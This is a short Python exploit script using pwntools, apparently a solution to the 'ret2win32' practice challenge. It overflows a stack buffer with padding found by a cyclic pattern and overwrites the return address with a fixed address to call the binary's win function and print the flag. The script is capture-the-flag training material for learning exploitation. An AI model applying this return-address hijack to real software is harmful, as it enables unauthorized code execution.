#!/usr/bin/env python
from pwn import *
exe = context.binary = ELF('ret2win32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
ret2win_address = 0x0804862c

io = start()
rop = ROP(exe)
buf = ""
buf += "A"*(cyclic_find('laaa')) 
buf += p32(ret2win_address)

log.info(rop.dump())
io.recvuntil('>')
io.sendline(buf)
log.success("flag: %s " %io.recvall())
